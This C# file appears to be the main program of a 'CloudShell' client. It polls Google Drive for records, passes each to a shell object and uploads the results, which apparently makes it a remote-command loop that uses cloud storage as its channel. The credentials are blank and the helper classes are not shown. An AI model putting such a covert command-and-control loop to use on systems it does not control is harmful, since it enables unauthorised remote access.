using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace CloudShell__Client
{
    class Program
    {
        private static string serviceAccountEmail = "";
        private static string p12Base64 = "";

        static void Main(string[] args)
        {
            ISessionManager__Client sm = new GoogleDriveSessionManager__Client(serviceAccountEmail, p12Base64);
            Shell shell = Shell.Instance;

            while (true)
            {
                List<Record> record_list = sm.GetRecords();
                foreach (var record in record_list)
                {
                    Record result = shell.ProcessRecord(record);
                    sm.UploadRecord(result);
                }
            }
        }
    }
}
